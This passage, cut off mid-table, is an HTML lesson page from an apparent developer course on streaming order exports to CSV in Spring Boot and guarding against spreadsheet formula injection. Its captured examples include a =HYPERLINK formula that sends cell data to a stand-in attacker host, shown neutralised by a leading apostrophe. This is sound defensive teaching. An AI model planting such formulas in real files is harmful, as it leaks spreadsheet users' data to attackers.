@@ -1,0 +1,1696 @@
+<title>Station 093 · Order export to CSV</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Schibsted+Grotesk:wght@500;700;800&family=Source+Sans+3:ital,wght@0,400;0,600;0,700;1,400&family=JetBrains+Mono:wght@400;600&display=swap">
+<style>
+/* Layout: one reading column; station header, page blueprint, sticky tab bar, one panel at a time.
+   Code always sits on a dark slate, like a terminal, in both themes. */
+:root {
+  --bg: #f4f6f8;
+  --surface: #ffffff;
+  --ink: #15212c;
+  --muted: #586a7a;
+  --line: #d9e1e8;
+  --accent: #0a7a63;
+  --accent-soft: #e0f2ec;
+  --warn: #9a5200;
+  --warn-soft: #fbefdc;
+  --bad: #b42318;
+  --bad-soft: #fde7e4;
+  --ok: #146c38;
+  --ok-soft: #e1f3e7;
+  --code-bg: #101b25;
+  --code-fg: #d7e2ea;
+  --code-dim: #7f93a3;
+  --code-key: #7fd1b9;
+  --code-str: #f2c879;
+  --code-type: #9cc4ff;
+  --code-num: #f59e8b;
+  --font-display: "Schibsted Grotesk", "Segoe UI", system-ui, sans-serif;
+  --font-body: "Source Sans 3", "Segoe UI", system-ui, sans-serif;
+  --font-mono: "JetBrains Mono", ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #0c131a; --surface: #121c25; --ink: #e2eaf0; --muted: #93a5b4; --line: #243341;
+    --accent: #45c9a6; --accent-soft: #11322b; --warn: #f0a650; --warn-soft: #36270f;
+    --bad: #ff8577; --bad-soft: #3b1815; --ok: #5bd394; --ok-soft: #12301f;
+    --code-bg: #0a1117; color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #0c131a; --surface: #121c25; --ink: #e2eaf0; --muted: #93a5b4; --line: #243341;
+  --accent: #45c9a6; --accent-soft: #11322b; --warn: #f0a650; --warn-soft: #36270f;
+  --bad: #ff8577; --bad-soft: #3b1815; --ok: #5bd394; --ok-soft: #12301f;
+  --code-bg: #0a1117; color-scheme: dark;
+}
+
+* { box-sizing: border-box; }
+body { background: var(--bg); color: var(--ink); font: 400 17px/1.6 var(--font-body); padding-inline: 16px; }
+.wrap { max-width: 1160px; margin: 0 auto; padding-block: 28px 64px; }
+h1, h2, h3 { font-family: var(--font-display); text-wrap: balance; line-height: 1.2; margin: 0; }
+h2 { font-size: 1.4rem; font-weight: 700; margin-top: 2.2rem; margin-bottom: .7rem; }
+h3 { font-size: 1.1rem; font-weight: 700; margin-top: 1.6rem; margin-bottom: .5rem; }
+p, ul, ol, dl { margin: 0 0 .9rem; }
+p, li, dd { max-width: 72ch; }
+a { color: var(--accent); }
+code { font-family: var(--font-mono); font-size: .86em; background: var(--accent-soft); color: var(--ink); padding: .08em .35em; border-radius: 4px; overflow-wrap: anywhere; }
+.muted { color: var(--muted); }
+.eyebrow { font: 600 .74rem/1.2 var(--font-body); letter-spacing: .09em; text-transform: uppercase; color: var(--muted); margin: 0 0 .4rem; }
+:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+
+/* Station header */
+.station { display: grid; gap: 14px; padding-bottom: 22px; border-bottom: 1px solid var(--line); }
+.station .num { font: 800 .9rem/1 var(--font-mono); color: var(--accent); letter-spacing: .04em; }
+.station h1 { font-size: clamp(1.9rem, 4.5vw, 2.8rem); font-weight: 800; letter-spacing: -.01em; }
+.station .scenario { font-size: 1.15rem; color: var(--muted); margin: 0; }
+.meta { display: flex; flex-wrap: wrap; gap: 8px; margin: 0; padding: 0; list-style: none; }
+.meta li { font-size: .88rem; border: 1px solid var(--line); background: var(--surface); padding: 3px 10px; border-radius: 999px; }
+.meta li b { font-weight: 600; color: var(--muted); margin-right: 4px; }
+.links { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 10px 24px; font-size: .95rem; }
+.links p { margin: 0; }
+.chip { display: inline-block; font-size: .82rem; font-weight: 600; color: var(--accent); background: var(--accent-soft); padding: 2px 9px; border-radius: 999px; }
+
+/* Blueprint */
+.blueprint { margin: 22px 0 0; background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 4px 18px; }
+.blueprint > summary { cursor: pointer; padding: 12px 0; font: 700 1rem var(--font-display); }
+.blueprint > p { color: var(--muted); font-size: .95rem; }
+
+/* Tabs */
+.tabbar { position: sticky; top: env(safe-area-inset-top, 0px); z-index: 5; background: var(--bg); margin: 26px -16px 0; padding: 0 16px; border-bottom: 1px solid var(--line); }
+.tabs { display: flex; gap: 2px; overflow-x: auto; scrollbar-width: thin; }
+.tabs button { flex: 0 0 auto; font: 600 .95rem var(--font-body); color: var(--muted); background: none; border: 0; border-bottom: 3px solid transparent; padding: 12px 8px 10px; cursor: pointer; white-space: nowrap; }
+.tabs button:hover { color: var(--ink); }
+.tabs button[aria-selected="true"] { color: var(--ink); border-bottom-color: var(--accent); }
+.tabs .grp { flex: 0 0 auto; align-self: center; font: 700 .68rem var(--font-body); letter-spacing: .08em; text-transform: uppercase; color: var(--accent); padding: 0 4px 0 10px; white-space: nowrap; }
+.tabs .grp:first-child { padding-left: 0; }
+
+/* Simulation banner, retry rule, class walkthrough */
+.sim { display: flex; gap: 10px; align-items: baseline; margin: 0; padding: 10px 14px; border-radius: 8px; background: var(--warn-soft); color: var(--ink); font-size: .95rem; }
+.sim b { color: var(--warn); white-space: nowrap; }
+.rulebox { border: 1px solid var(--accent); border-radius: 10px; padding: 14px 18px; margin: 0 0 1rem; background: var(--surface); }
+.rulebox .eyebrow { color: var(--accent); }
+.rulebox ul { margin-bottom: .6rem; }
+.rulebox p:last-child { margin-bottom: 0; font-weight: 600; }
+.dwn { display: grid; grid-template-columns: max-content minmax(0, 1fr); gap: 4px 14px; margin: 0 0 .6rem; font-size: .95rem; }
+.dwn dt { font: 700 .74rem/1.9 var(--font-body); letter-spacing: .07em; text-transform: uppercase; color: var(--muted); }
+.dwn dd { margin: 0; }
+details.check { border-color: var(--ok); margin-top: 1.2rem; }
+.limit { padding: 10px 14px; border-radius: 8px; background: var(--warn-soft); font-size: .95rem; }
+.limit b { color: var(--warn); }
+.panel { padding-top: 22px; }
+.panel > h2:first-of-type { margin-top: 1.4rem; }
+
+.belongs { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 4px 28px; border: 1px dashed var(--accent); background: var(--accent-soft); border-radius: 10px; padding: 14px 18px; }
+.belongs .eyebrow { grid-column: 1 / -1; color: var(--accent); }
+.belongs ul { margin: 0; padding-left: 1.1rem; font-size: .95rem; }
+.belongs .rule { margin: 0; font-size: .95rem; }
+
+/* Beginner layer */
+.level { display: inline-block; margin: 1.6rem 0 0; font: 700 .76rem/1 var(--font-body); letter-spacing: .09em; text-transform: uppercase; padding: 6px 10px; border-radius: 6px; }
+.level.start { color: var(--ok); background: var(--ok-soft); }
+.level.deep { color: var(--accent); background: var(--accent-soft); margin-top: 2.6rem; }
+.level + h2 { margin-top: .9rem; }
+.story { list-style: none; counter-reset: story; padding: 0; display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; }
+.story li { counter-increment: story; background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 14px 16px; }
+.story li::before { content: "Step " counter(story); display: block; font: 600 .74rem var(--font-body); letter-spacing: .08em; text-transform: uppercase; color: var(--muted); margin-bottom: 4px; }
+.story li strong { font-family: var(--font-display); font-size: 1.05rem; }
+.story li p { margin: 6px 0 0; font-size: .95rem; }
+.story li:last-child { border-color: var(--ok); }
+.lesson { font: 700 1.1rem/1.4 var(--font-display); }
+.scope li { margin-bottom: .5rem; }
+.challenge { border-top: 1px solid var(--line); margin-top: 2rem; padding-top: .4rem; }
+.challenge h2 { margin-top: .3rem; }
+
+/* Content blocks */
+.gwt li, .rules li, .steps li { margin-bottom: .5rem; }
+.gwt b { font-family: var(--font-display); font-weight: 700; color: var(--accent); }
+.note { border-left: 3px solid var(--line); padding: 4px 0 4px 14px; color: var(--muted); }
+.scroll { overflow-x: auto; margin: 0 0 1rem; border: 1px solid var(--line); border-radius: 10px; background: var(--surface); }
+table { border-collapse: collapse; width: 100%; font-size: .93rem; }
+table.narrow { width: auto; min-width: 320px; }
+th, td { text-align: left; vertical-align: top; padding: 9px 12px; border-bottom: 1px solid var(--line); }
+th { font: 600 .74rem var(--font-body); letter-spacing: .07em; text-transform: uppercase; color: var(--muted); background: var(--bg); }
+tbody tr:last-child td { border-bottom: 0; }
+td { font-variant-numeric: tabular-nums; }
+.pill { display: inline-block; font: 600 .8rem/1.4 var(--font-mono); padding: 1px 8px; border-radius: 999px; white-space: nowrap; }
+.pill.ok { color: var(--ok); background: var(--ok-soft); }
+.pill.warn { color: var(--warn); background: var(--warn-soft); }
+.pill.bad { color: var(--bad); background: var(--bad-soft); }
+
+pre { margin: 0 0 1rem; }
+pre.code, pre.console, pre.tree { background: var(--code-bg); color: var(--code-fg); border-radius: 10px; padding: 14px 16px; overflow-x: auto; font: 400 .82rem/1.55 var(--font-mono); }
+pre.code code, pre.console, pre.tree { background: none; color: inherit; padding: 0; font-size: inherit; overflow-wrap: normal; }
+pre.console { color: var(--code-key); }
+.hljs-keyword, .hljs-built_in, .hljs-literal, .hljs-meta .hljs-keyword { color: var(--code-key); }
+.hljs-string, .hljs-attr + .hljs-string { color: var(--code-str); }
+.hljs-title, .hljs-type, .hljs-title.class_ { color: var(--code-type); }
+.hljs-number { color: var(--code-num); }
+.hljs-comment, .hljs-doctag { color: var(--code-dim); font-style: italic; }
+.hljs-meta, .hljs-attr, .hljs-attribute, .hljs-section, .hljs-name, .hljs-tag { color: var(--code-type); }
+
+.example { margin-bottom: 1.4rem; }
+.example h3 { margin-top: 1.2rem; }
+.example > p { color: var(--muted); }
+.pair { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 12px; }
+.pair > div { min-width: 0; }
+
+.trap { border: 1px solid var(--warn); background: var(--warn-soft); border-radius: 10px; padding: 14px 18px; margin-bottom: 1rem; }
+.trap .eyebrow { color: var(--warn); }
+.trap .lead { font: 700 1.15rem/1.35 var(--font-display); }
+.trap p:last-child { margin-bottom: 0; }
+
+pre.mermaid { background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 14px; overflow-x: auto; font: .8rem/1.5 var(--font-mono); }
+
+.facts { display: grid; grid-template-columns: max-content minmax(0, 1fr); gap: 10px 22px; }
+.facts dt { font: 700 1rem var(--font-display); }
+.facts dd { margin: 0; }
+
+.files { display: grid; grid-template-columns: 220px minmax(0, 1fr); gap: 16px; align-items: start; }
+.file-list { display: flex; flex-direction: column; gap: 2px; position: sticky; top: calc(env(safe-area-inset-top, 0px) + 56px); }
+.file-btn { text-align: left; font: 400 .82rem var(--font-mono); color: var(--muted); background: none; border: 0; border-left: 3px solid transparent; padding: 7px 10px; cursor: pointer; border-radius: 0 6px 6px 0; overflow-wrap: anywhere; }
+.file-btn:hover { color: var(--ink); background: var(--surface); }
+.file-btn[aria-selected="true"] { color: var(--ink); font-weight: 600; border-left-color: var(--accent); background: var(--surface); }
+.file-body { min-width: 0; }
+.path { font: 400 .8rem var(--font-mono); color: var(--muted); margin-bottom: .4rem; overflow-wrap: anywhere; }
+.notes ul { padding-left: 1.1rem; font-size: .95rem; }
+.notes p { font-size: .95rem; }
+
+details.qa, details.finding { background: var(--surface); border: 1px solid var(--line); border-radius: 10px; padding: 0 16px; margin-bottom: 8px; }
+details.qa > summary, details.finding > summary { cursor: pointer; padding: 12px 0; font-weight: 600; }
+details.qa[open] > summary, details.finding[open] > summary { border-bottom: 1px solid var(--line); margin-bottom: 10px; }
+.finding .sev { display: inline-grid; place-items: center; width: 1.5rem; height: 1.5rem; margin-right: 10px; border-radius: 50%; font: 700 .8rem var(--font-mono); color: var(--bad); background: var(--bad-soft); }
+.finding .evidence { font-size: .95rem; color: var(--muted); }
+
+@media (max-width: 720px) {
+  body { font-size: 16px; }
+  .pair, .files, .belongs, .story, .dwn { grid-template-columns: minmax(0, 1fr); }
+  .sim { flex-direction: column; gap: 2px; }
+  .file-list { position: static; flex-direction: row; flex-wrap: wrap; }
+  .file-btn { border-left: 0; border-bottom: 2px solid transparent; border-radius: 6px; }
+  .file-btn[aria-selected="true"] { border-bottom-color: var(--accent); }
+  .facts { grid-template-columns: minmax(0, 1fr); gap: 2px; }
+  .facts dd { margin-bottom: 10px; }
+}
+@media (prefers-reduced-motion: reduce) { * { scroll-behavior: auto !important; } }
+</style>
+
+<div class="wrap">
+  <header class="station">
+    <span class="num">STATION 093</span>
+    <h1>Order export to CSV</h1>
+    <p class="scenario">Exporting a year of orders runs out of memory, and a product named &#x27;=HYPERLINK(...)&#x27; ran a formula in Excel.</p>
+    <p class="sim"><b>Simulation</b><span>The sellers, orders and buyers' cities are demo data, not Kartwala's. The link in the attacker's product name points at an example address.</span></p>
+    <ul class="meta">
+      <li><b>Stage</b>Working Systems</li>
+      <li><b>Experience</b>0–2 years</li>
+      <li><b>Track</b>Core</li>
+      <li><b>Industry</b>E-commerce</li>
+      <li><b>Types</b>Database · Security</li>
+      <li><b>Reviewer view</b>Yes</li>
+    </ul>
+    <div class="links">
+      <p><span class="eyebrow">Before this</span><br>092 KYC document upload</p>
+      <p><span class="eyebrow">Builds toward</span><br>None</p>
+      <p><span class="eyebrow">Stack</span><br>Spring Boot 4.1.1 · Java 25 · StreamingResponseBody · JDBC fetch size and cursors · CSV escaping and formula injection · Spring Security 7 · PostgreSQL 17 · Testcontainers</p>
+    </div>
+  </header>
+
+  <nav class="tabbar" aria-label="Station sections">
+    <div class="tabs" role="tablist"><span class="grp" role="presentation">1 · Understand</span><button role="tab" id="tab-understand" aria-controls="panel-understand" aria-selected="true" tabindex="0" data-tab="understand">Understand</button><span class="grp" role="presentation">2 · Build</span><button role="tab" id="tab-spec" aria-controls="panel-spec" aria-selected="false" tabindex="-1" data-tab="spec">Spec</button><button role="tab" id="tab-api" aria-controls="panel-api" aria-selected="false" tabindex="-1" data-tab="api">API contract</button><button role="tab" id="tab-trap" aria-controls="panel-trap" aria-selected="false" tabindex="-1" data-tab="trap">Edge cases & trap</button><button role="tab" id="tab-code" aria-controls="panel-code" aria-selected="false" tabindex="-1" data-tab="code">Set up & code</button><button role="tab" id="tab-tests" aria-controls="panel-tests" aria-selected="false" tabindex="-1" data-tab="tests">Tests</button><button role="tab" id="tab-practice" aria-controls="panel-practice" aria-selected="false" tabindex="-1" data-tab="practice">Practice</button><span class="grp" role="presentation">3 · Go deeper</span><button role="tab" id="tab-design" aria-controls="panel-design" aria-selected="false" tabindex="-1" data-tab="design">Design</button><button role="tab" id="tab-production" aria-controls="panel-production" aria-selected="false" tabindex="-1" data-tab="production">Production</button><button role="tab" id="tab-interview" aria-controls="panel-interview" aria-selected="false" tabindex="-1" data-tab="interview">Interview</button><button role="tab" id="tab-review" aria-controls="panel-review" aria-selected="false" tabindex="-1" data-tab="review">Review</button></div>
+  </nav>
+
+  <main><section role="tabpanel" id="panel-understand" aria-labelledby="tab-understand" class="panel"><aside class="belongs"><p class="eyebrow">Belongs in this tab</p><ul><li>The real-life problem as a 3-step story</li><li>What we are building, and an everyday analogy</li><li>How it works in 4 steps</li><li>One question to check yourself</li><li>What this station is not</li><li>Key terms</li></ul><p class="rule">Level 1, about 5 minutes. Plain language: no code.</p></aside>
+<h2>The problem in real life</h2>
+<ol class="story"><li><strong>A year of orders</strong><p>A big seller exported a year of orders. The old code read every order into a list, built the whole file as one String, and only then sent it. The server ran out of memory.</p></li><li><strong>A product that clicks itself</strong><p>Another seller opened an export in Excel. One product name, typed by an attacker, was =HYPERLINK(...). Excel showed it as a link, "Click for refund", that sent data to the attacker's site.</p></li><li><strong>The fix</strong><p>The export is written row by row while the database hands rows over a thousand at a time, so memory stays flat. Any cell that would start a formula gets a leading apostrophe, and cells are quoted the CSV way.</p></li></ol>
+<p class="lesson">A file you hand to someone's spreadsheet is code they will run. Write it row by row, and never let a cell start a formula.</p>
+
+<h2>What are we building?</h2>
+<p>A CSV export of a seller's own orders between two dates, streamed from the database, safe to open in Excel.</p>
+
+<h2>An everyday analogy</h2>
+<p>A kitchen that plates each dish as it is cooked instead of waiting for all 500, and checks that no customer's note on an order is an instruction to the cashier.</p>
+
+<h2>How it works in 4 steps</h2>
+<ol class="steps">
+<li><strong>Check</strong> the dates (at most a year) and who is asking: the seller comes from the sign-in.</li>
+<li><strong>Record</strong> the export in a log, then start the answer: a CSV attachment.</li>
+<li><strong>Stream</strong>: the database hands over 1,000 rows at a time; each row is written and forgotten.</li>
+<li><strong>Escape</strong> each text cell: a leading apostrophe for formula characters, quotes for commas and quotes.</li>
+</ol>
+
+<details class="qa check"><summary>Check yourself: is putting a cell like =1+1 in quotes enough to stop the formula?</summary><p>No. Quotes are CSV syntax: the spreadsheet removes them and still sees =1+1. A leading apostrophe makes it text. That is the Review tab's second finding.</p></details>
+
+<h2>What this station is not</h2>
+<ul class="scope">
+<li><strong>No background jobs.</strong> The export runs in the request; challenge 3 moves big ones to a job.</li>
+<li><strong>No Excel files.</strong> Only CSV.</li>
+<li><strong>No buyer names.</strong> Only cities, to keep personal data small.</li>
+</ul>
+
+<h2>Key terms</h2>
+<div class="scroll"><table class=""><thead><tr><th>Term</th><th>Simple meaning</th><th>Everyday example</th><th>In this project</th></tr></thead><tbody><tr><td><strong>CSV</strong></td><td>A text file of rows, cells separated by commas, that spreadsheets open.</td><td>A table written on lined paper.</td><td><code>orders-....csv</code></td></tr><tr><td><strong>Streaming</strong></td><td>Sending the file while it is being made, row by row.</td><td>Serving food as it comes off the stove.</td><td><code>StreamingResponseBody</code></td></tr><tr><td><strong>Fetch size</strong></td><td>How many rows the database hands over at a time.</td><td>Bringing plates out ten at a time.</td><td>1,000</td></tr><tr><td><strong>Formula injection</strong></td><td>A cell starting with = that a spreadsheet runs as a formula.</td><td>A note in the order book that says "call this number".</td><td><code>=HYPERLINK(...)</code></td></tr><tr><td><strong>Content-Disposition</strong></td><td>A header that tells the browser to save the answer as a file, with a name.</td><td>The label on a parcel.</td><td><code>attachment; filename=...</code></td></tr><tr><td><strong>Byte order mark</strong></td><td>Three bytes at the start that tell Excel the file is UTF-8.</td><td>A language sticker on a book.</td><td><code>EF BB BF</code></td></tr></tbody></table></div></section><section role="tabpanel" id="panel-spec" aria-labelledby="tab-spec" class="panel" hidden><aside class="belongs"><p class="eyebrow">Belongs in this tab</p><ul><li>1. Business problem</li><li>2. Acceptance criteria</li><li>3. Requirements</li><li>4. Learning objectives</li></ul><p class="rule">Level 2. What a teammate hands you before you build.</p></aside>
+<h2>Business problem</h2>
+<p><strong>Kartwala</strong> (a fictional marketplace): exporting a year of orders runs out of memory, and a product named <code>=HYPERLINK(...)</code> ran a formula in Excel.</p>
+
+<h2>Acceptance criteria</h2>
+<p class="muted">Demo users: sellers neha.store (seller 1) and arun.mart (seller 2), support sam.help; password: the name before the dot plus <code>-demo-pass</code>. Demo rule: at most 366 days, both ends included; days are IST days.</p>
+<ol class="gwt">
+<li><b>Given</b> a valid range, <b>then</b> <code>200</code>, a UTF-8 CSV attachment with a header and the seller's orders, oldest first.</li>
+<li><b>Given</b> a cell starting with = + - @, a tab or CR, <b>then</b> it starts with ' in the file; commas and quotes are quoted the RFC 4180 way.</li>
+<li><b>Given</b> a million orders, <b>then</b> the first lines arrive about as fast as an empty export's.</li>
+<li><b>Given</b> another seller's orders, <b>then</b> never in the file, whatever the request adds; support <code>403</code>; no sign-in <code>401</code>.</li>
+<li><b>Given</b> a range the wrong way round, over 366 days or not a date, <b>then</b> <code>400</code>.</li>
+</ol>
+
+<h2>Requirements</h2>
+<ul class="rules">
+<li>No list of all rows, no whole file in memory.</li>
+<li>Every export recorded before it starts.</li>
+<li>The range rule also in the database.</li>
+</ul>
+
+<h2>Learning objectives</h2>
+<ul>
+<li>Stream a response with <code>StreamingResponseBody</code> and stream rows from PostgreSQL with a fetch size.</li>
+<li>Escape CSV cells for both CSV and spreadsheets.</li>
+<li>Name and type a download with <code>Content-Disposition</code> and a charset.</li>
+<li>Prove streaming with a test that fails when rows are loaded first.</li>
+</ul>
+</section><section role="tabpanel" id="panel-api" aria-labelledby="tab-api" class="panel" hidden><aside class="belongs"><p class="eyebrow">Belongs in this tab</p><ul><li>5. API contract</li><li>Real request/response examples captured from the running app</li></ul><p class="rule">Examples are captured with curl from the running app and its PostgreSQL, never typed by hand.</p></aside>
+<h2>Endpoint</h2>
+<div class="scroll"><table class=""><thead><tr><th>Method</th><th>Path</th><th>Purpose</th></tr></thead><tbody><tr><td><code>GET</code></td><td><code>/seller/orders/export?from=YYYY-MM-DD&amp;to=YYYY-MM-DD</code></td><td>The signed-in seller's orders on those IST days, as a CSV attachment.</td></tr></tbody></table></div>
+<h2>Status codes</h2>
+<div class="scroll"><table class=""><thead><tr><th>Status</th><th>When</th></tr></thead><tbody><tr><td><span class="pill ok">200</span></td><td>The CSV (the header alone if there are no orders)</td></tr><tr><td><span class="pill warn">400</span></td><td>A date that is not a date; to before from; more than 366 days</td></tr><tr><td><span class="pill warn">401</span></td><td>No sign-in, or a wrong password</td></tr><tr><td><span class="pill warn">403</span></td><td>Not a seller (support)</td></tr></tbody></table></div>
+<h2>Captured examples</h2>
+<p class="muted">Captured with curl from the running app on 23 Oct 2026, in this order. <code>Date</code>, connection and standard security headers are left out; the byte order mark at the start of each CSV is not shown here (its bytes, read by <code>od</code>: <code>ef bb bf</code>).</p>
+<section class="example"><h3>Case 1: Neha exports 2026</h3><p><b>Why:</b> her five orders, oldest first. The comma, the quotes and the Hindi name are quoted; the formula, the + and the @ start with '.</p><div class="pair"><div><p class="eyebrow">Request</p><pre class="code"><code class="language-http">GET /seller/orders/export?from=2026-01-01&amp;to=2026-12-31 HTTP/1.1
+Authorization: Basic bmVoYS5zdG9yZTpuZWhhLWRlbW8tcGFzcw==</code></pre></div><div><p class="eyebrow">Response</p><pre class="code"><code class="language-http">HTTP/1.1 200 
+Content-Disposition: attachment; filename=&quot;orders-2026-01-01-to-2026-12-31.csv&quot;
+Content-Type: text/csv;charset=UTF-8
+
+order_ref,placed_at_ist,product,quantity,amount_rupees,buyer_city,status
+KW-1001,2026-01-05 10:15,&quot;Cotton kurta, blue&quot;,2,1299.00,Pune,DELIVERED
+KW-1002,2026-03-17 23:50,&quot;Mug &quot;&quot;Chai time&quot;&quot;&quot;,1,349.00,Chennai,SHIPPED
+KW-1003,2026-06-30 18:29,&quot;&#x27;=HYPERLINK(&quot;&quot;http://evil.example/?d=&quot;&quot;&amp;A1,&quot;&quot;Click for refund&quot;&quot;)&quot;,1,99.00,Delhi,PLACED
+KW-1004,2026-07-01 09:00,&#x27;+91 Special offer,3,597.00,&#x27;@Mumbai,CANCELLED
+KW-1005,2026-12-31 23:59,&quot;साड़ी, सिल्क&quot;,1,4599.00,Varanasi,PLACED</code></pre></div></div></section><section class="example"><h3>Case 2: Arun exports 2026</h3><p><b>Why:</b> only his order: the seller comes from the sign-in.</p><div class="pair"><div><p class="eyebrow">Request</p><pre class="code"><code class="language-http">GET /seller/orders/export?from=2026-01-01&amp;to=2026-12-31 HTTP/1.1
+Authorization: Basic YXJ1bi5tYXJ0OmFydW4tZGVtby1wYXNz</code></pre></div><div><p class="eyebrow">Response</p><pre class="code"><code class="language-http">HTTP/1.1 200 
+Content-Disposition: attachment; filename=&quot;orders-2026-01-01-to-2026-12-31.csv&quot;
+Content-Type: text/csv;charset=UTF-8
+
+order_ref,placed_at_ist,product,quantity,amount_rupees,buyer_city,status
+AM-2001,2026-02-11 12:00,Steel bottle,1,499.00,Kochi,DELIVERED</code></pre></div></div></section><section class="example"><h3>Case 3: 30 June 2026</h3><p><b>Why:</b> 18:29 IST is that day; KW-1004 at 09:00 IST on 1 July is not.</p><div class="pair"><div><p class="eyebrow">Request</p><pre class="code"><code class="language-http">GET /seller/orders/export?from=2026-06-30&amp;to=2026-06-30 HTTP/1.1
+Authorization: Basic bmVoYS5zdG9yZTpuZWhhLWRlbW8tcGFzcw==</code></pre></div><div><p class="eyebrow">Response</p><pre class="code"><code class="language-http">HTTP/1.1 200 
+Content-Disposition: attachment; filename=&quot;orders-2026-06-30-to-2026-06-30.csv&quot;
+Content-Type: text/csv;charset=UTF-8
+
+order_ref,placed_at_ist,product,quantity,amount_rupees,buyer_city,status
+KW-1003,2026-06-30 18:29,&quot;&#x27;=HYPERLINK(&quot;&quot;http://evil.example/?d=&quot;&quot;&amp;A1,&quot;&quot;Click for refund&quot;&quot;)&quot;,1,99.00,Delhi,PLACED</code></pre></div></div></section><section class="example"><h3>Case 4: 367 days</h3><p><b>Why:</b> <code>400</code>.</p><div class="pair"><div><p class="eyebrow">Request</p><pre class="code"><code class="language-http">GET /seller/orders/export?from=2025-01-01&amp;to=2026-01-02 HTTP/1.1
+Authorization: Basic bmVoYS5zdG9yZTpuZWhhLWRlbW8tcGFzcw==</code></pre></div><div><p class="eyebrow">Response</p><pre class="code"><code class="language-http">HTTP/1.1 400 
+Content-Type: application/problem+json
+
+{
+  &quot;detail&quot;: &quot;from must be on or before to, and at most a year apart&quot;,
+  &quot;instance&quot;: &quot;/seller/orders/export&quot;,
+  &quot;status&quot;: 400,
+  &quot;title&quot;: &quot;Bad Request&quot;
+}</code></pre></div></div></section><section class="example"><h3>Case 5: month 13</h3><p><b>Why:</b> <code>400</code>.</p><div class="pair"><div><p class="eyebrow">Request</p><pre class="code"><code class="language-http">GET /seller/orders/export?from=2026-01-01&amp;to=2026-13-01 HTTP/1.1
+Authorization: Basic bmVoYS5zdG9yZTpuZWhhLWRlbW8tcGFzcw==</code></pre></div><div><p class="eyebrow">Response</p><pre class="code"><code class="language-http">HTTP/1.1 400 
+Content-Type: application/problem+json
+
+{
+  &quot;detail&quot;: &quot;Failed to convert &#x27;to&#x27; with value: &#x27;2026-13-01&#x27;&quot;,
+  &quot;instance&quot;: &quot;/seller/orders/export&quot;,
+  &quot;status&quot;: 400,
+  &quot;title&quot;: &quot;Bad Request&quot;
+}</code></pre></div></div></section><section class="example"><h3>Case 6: support</h3><p><b>Why:</b> <code>403</code>: buyers' data is for the seller.</p><div class="pair"><div><p class="eyebrow">Request</p><pre class="code"><code class="language-http">GET /seller/orders/export?from=2026-01-01&amp;to=2026-12-31 HTTP/1.1
+Authorization: Basic c2FtLmhlbHA6c2FtLWRlbW8tcGFzcw==</code></pre></div><div><p class="eyebrow">Response</p><pre class="code"><code class="language-http">HTTP/1.1 403 
+Content-Type: application/problem+json
+Content-Length: 111
+
+{
+  &quot;title&quot;: &quot;Not allowed&quot;,
+  &quot;status&quot;: 403,
+  &quot;detail&quot;: &quot;This sign-in cannot do this.&quot;,
+  &quot;instance&quot;: &quot;/seller/orders/export&quot;
+}</code></pre></div></div></section><section class="example"><h3>Case 7: no sign-in</h3><p><b>Why:</b> <code>401</code>.</p><div class="pair"><div><p class="eyebrow">Request</p><pre class="code"><code class="language-http">GET /seller/orders/export?from=2026-01-01&amp;to=2026-12-31 HTTP/1.1</code></pre></div><div><p class="eyebrow">Response</p><pre class="code"><code class="language-http">HTTP/1.1 401 
+WWW-Authenticate: Basic realm=&quot;kartwala&quot;
+Content-Type: application/problem+json
+Content-Length: 123
+
+{
+  &quot;title&quot;: &quot;Sign-in required&quot;,
+  &quot;status&quot;: 401,
+  &quot;detail&quot;: &quot;Send a valid username and password.&quot;,
+  &quot;instance&quot;: &quot;/seller/orders/export&quot;
+}</code></pre></div></div></section>
+<h2>The export log afterwards</h2>
+<p class="muted">Seller, from, to. Refused requests left no entry; the last line is the export <code>docs/capture.sh</code> ran to read the byte order mark.</p>
+<pre class="code"><code class="language-text"> seller_id | from_date  |  to_date   
+-----------+------------+------------
+         1 | 2026-01-01 | 2026-12-31
+         2 | 2026-01-01 | 2026-12-31
+         1 | 2026-06-30 | 2026-06-30
+         1 | 2026-01-01 | 2026-12-31
+(4 rows)</code></pre></section><section role="tabpanel" id="panel-trap" aria-labelledby="tab-trap" class="panel" hidden><aside class="belongs"><p class="eyebrow">Belongs in this tab</p><ul><li>6. Edge cases and failure cases</li><li>7. The trap, shown failing with a test</li></ul><p class="rule">Every edge case points at the test that proves it.</p></aside>
+<h2>Edge cases</h2>
+<div class="scroll"><table class=""><thead><tr><th>Case</th><th>What happens</th><th>Proved by</th></tr></thead><tbody><tr><td>A year of orders</td><td>Attachment, charset, BOM, every line exact</td><td><code>aYearOfOrdersAsAnAttachmentInIstDaysOldestFirst</code></td></tr><tr><td>One IST day; a month with no orders</td><td>That day only; the header alone</td><td><code>theDaysAreIndianDays</code></td></tr><tr><td>Wrong way round, 367 days, month 13; 366 days; a leap year</td><td><code>400</code>; <code>200</code></td><td><code>badRangesAre400</code></td></tr><tr><td>Signs, tabs, line breaks, empty cells, = inside text</td><td>Escaped only where needed</td><td><code>cellsAreEscapedTheSpreadsheetWay</code></td></tr><tr><td>The old way</td><td>A formula cell, a split cell</td><td><code>theOldWayHeldEverythingAndPassedTheFormulaOn</code></td></tr><tr><td>The API on the same orders</td><td>Neutralised and quoted</td><td><code>theApiNeutralisesFormulasAndQuotesCells</code></td></tr><tr><td>A million orders</td><td>First lines about as fast as an empty export</td><td><code>theFirstLinesArriveLongBeforeAllRowsCouldHaveBeenRead</code></td></tr><tr><td>No sign-in, a wrong password, support</td><td><code>401</code>, <code>401</code>, <code>403</code>, nothing logged</td><td><code>withoutASignInIt401sAndSupportMayNotExport</code></td></tr><tr><td>Another seller's orders, also with ?sellerId=1</td><td>Never in the 